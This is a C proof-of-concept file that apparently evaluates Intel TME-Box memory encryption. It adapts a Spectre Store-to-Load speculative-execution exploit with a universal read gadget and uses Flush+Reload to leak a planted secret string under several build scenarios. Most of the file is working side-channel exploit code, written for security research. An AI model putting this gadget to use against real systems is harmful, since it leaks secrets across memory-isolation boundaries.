#include <assert.h>
#include <malloc.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <keyutils.h>
#include <sys/mman.h>

#include "cacheutils.h"

#define sys_encrypt_mprotect    451
long enc_mprotect(void *addr, size_t len, int prot, key_serial_t key) {
  return syscall(sys_encrypt_mprotect, addr, len, prot, key);
}

#define MEASUREMENTS 100000
#define ASSERT_DOMAIN(pointer, domain) (char *)((((uint64_t)(pointer)) & ~kPtrTagMask) | ((uint64_t)(domain) & kPtrTagMask))

typedef void (*cache_encode_fp)(char*,char,size_t);

/********************************************************************
TME-Box code.
Source: https://github.com/IntelLabs/TME-MK-Fine-Grained-Encryption-Integrity/blob/502f9c1f9bdd73f9f7731633916e680fe9835608/test.c
********************************************************************/
#define CLSIZE 64
#define CLMASK (uintptr_t)(CLSIZE - 1)

uint64_t kPtrTagMask = 0x00003f0000000000uLL;
#define _read8_q(ptr)                                                          \
  ({                                                                           \
    volatile uint64_t __result = 0xDEAD;                                       \
    __result = (*(volatile uint64_t *)(ptr));                                  \
    __result;                                                                  \
  })
#define _write_q(ptr, value)                                                   \
  do {                                                                         \
    (*(volatile uint64_t *)(ptr)) = (uint64_t)(value);                         \
  } while (0)
#define _is_tagged(ptr) ((uint64_t)(ptr) & kPtrTagMask)
#define _is_aligned(ptr) (((uintptr_t)(p) & CLMASK) == 0)
#define _check_access(ptr)                                                     \
  do {                                                                         \
    if ((uintptr_t)ptr != 0 && (uintptr_t)ptr != -1ULL) {                      \
      uint64_t _expected = 0xFF00000000000000ULL | (uint64_t)ptr;              \
      volatile uint64_t _result = 0;                                           \
      volatile uint64_t _previous = _read8_q(ptr);                             \
      _write_q(ptr, _expected);                                                \
      _result = _read8_q(ptr);                                                 \
      assert(_result == _expected);                                            \
      _write_q(ptr, _previous);                                                \
    }                                                                          \
  } while (0)

void *check(void *p) {
  printf("p = %13p  ", p);

#if defined(SCENARIO1) || defined(SCENARIO2) || defined(SCENARIO3)
  assert(_is_aligned(p));
  printf("[OK] aligned. ");

  assert(_is_tagged(p));
  printf("[OK] tagged. ");

  _check_access(p);
  printf("[OK] access. ");
#endif

  printf("\n");
  return p;
}

/********************************************************************
Transientfail Spectre STL sa_ip code.
Source: https://github.com/isec-tugraz/transientfail/blob/43947508d8ba9ffc3066ae6781174de8ac5c6de1/pocs/spectre/STL/main.c
Modified to work with TME-Box and contain a universal read gadget
********************************************************************/
#define PUBLIC      "###################"
#define SECRET      "INACCESSIBLE SECRET"

char *public;
char *secret;
char *data;

void access_array(int x, cache_encode_fp fp, int actual_idx) {
  // store secret in data
#if defined(SCENARIO3)
  char *ptr = ASSERT_DOMAIN(data+x, secret);
  fp = (cache_encode_fp)ASSERT_DOMAIN(fp, secret);
#else
  char *ptr = data + x;
#endif

  int a = 61 * 62 * 63 * 64;
  int b = 61, c = 62, d = 63, e = 64;

  // flushing the data which is used in the condition increases
  // probability of speculation
  mfence();
  char** data_slowptr = &ptr;
  char*** data_slowslowptr = &data_slowptr;
  mfence();
  flush(&a);
  flush(&b);
  flush(&c);
  flush(&d);
  flush(&e);
  flush(&x);
  flush(data_slowptr);
  flush(&data_slowptr);
  flush(data_slowslowptr);
  flush(&data_slowslowptr);
  // ensure data is flushed at this point
  mfence();
  a = a / b / c / d / e;
  a -= 1;

  // overwrite data via different pointer
  // pointer chasing makes this extremely slow
  data_slowslowptr += a;
  (*(*data_slowslowptr)) = data;

  // data[x] should now be "#"
  // uncomment next line to break attack
#if defined(SERIALIZE_SW)
  mfence();
#endif
  // Encode stale value in the cache
  char ch = *ptr;
  if (ch == SECRET[actual_idx])
    fp(mem, ch, pagesize);
}

key_serial_t key;
void init_key() {
  char *key_type = "mktme";
  char *key_desc = "code_page";
  char *key_opt = "type=cpu algorithm=aes-xts-128";
  key = add_key(
    key_type, 
    key_desc, 
    key_opt, 
    strlen(key_opt), 
    KEY_SPEC_THREAD_KEYRING);
  if (key == -1) {
    printf("\tadd_key FAILED!\n");
    fflush(stdout);
    exit(-1);
  }
}

void *copy_function_to_new_domain(void *fp, size_t f_len) {
  void *addr  = (void *)((1L<<44) & kPtrTagMask);
  size_t len  = (f_len & ~(pagesize - 1)) + pagesize;
  int prot    = PROT_READ | PROT_WRITE | PROT_EXEC;
  int flags   = MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE;

  void *code_page = mmap(addr, len, prot, flags, -1, 0);
  if (code_page == MAP_FAILED) {
    printf("\tmmap FAILED!\n");
    fflush(stdout);
    keyctl(KEYCTL_INVALIDATE, key);
    exit(-1);
  }
  assert(((uint64_t)code_page & 0xFFF) == 0);
  enc_mprotect(code_page, len, prot, key);
  printf("code_page @ %p\n", code_page);

  memcpy(code_page, fp, f_len);
  return code_page;
}

int main(int argc, const char **argv) {
  public = check(malloc(128));
  memset(public, 0, 128);
  memcpy(public, PUBLIC, sizeof(PUBLIC));

  secret = check(malloc(128));
  memset(secret, 0, 128);
  memcpy(secret, SECRET, sizeof(SECRET));

  // Detect cache threshold
  if (!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
  
  pagesize = sysconf(_SC_PAGESIZE);

  char *_mem = malloc(pagesize * (256 + 4));
  // page aligned
  mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
  // initialize memory
  memset(mem, 0, pagesize * 256);

  init_key();
  cache_encode_fp encode_cache = copy_function_to_new_domain(cache_encode_new, pagesize);

  // Flush our shared memory
  flush_shared_memory();

  // nothing leaked so far
  char leaked[sizeof(SECRET) + 1];
  memset(leaked, ' ', sizeof(leaked));
  leaked[sizeof(SECRET)] = 0;

#ifdef SCENARIO1
  data = public;
#elif defined(SCENARIO2)
  data = secret + sizeof(SECRET);
#elif defined(SCENARIO3)
  data = secret + sizeof(SECRET);
#else
  data = public;
#endif

#if defined(EXEC_PREV)
  assert((((uint64_t)cache_encode_new) & (pagesize - 1)) == 0);
  mprotect(cache_encode, pagesize, PROT_NONE);
#endif

  int idx = 0;
  int score = 0;
  while(idx < MEASUREMENTS) {
    // for every byte in the string
    int j = idx % (sizeof(SECRET) - 1);

    // overwrite value with X, then access
#if defined(SCENARIO1)
    access_array(j + ((uint64_t)secret - (uint64_t)public), encode_cache, j);
#elif defined(SCENARIO2)
    access_array(j - sizeof(SECRET), encode_cache, j);
#elif defined(SCENARIO3)
    access_array(j - sizeof(SECRET), encode_cache, j);
#else
    access_array(j + ((uint64_t)secret - (uint64_t)public), encode_cache, j);
#endif

    mfence(); // avoid speculation
    // Recover data from covert channel
    char c = cache_decode_i(j);
    if (c != '_') leaked[j] = c;

    score += (c == secret[j] && c != ' ' && c != '\0');

    sched_yield();
    idx += 1;
  }

  printf("secret: %s\n", secret);
  printf("leaked: "FG_YELLOW"%s"RESET"\n", leaked);
  printf(FG_YELLOW"SCORE: %d/%d"RESET"\t>>> %s <<<\n", score, MEASUREMENTS, score > 0 ? FG_RED"LEAKY"RESET : FG_GREEN"PROTECTED"RESET);
  printf("[\x1b[32m>\x1b[0m] Done\n");

  return 0;
}
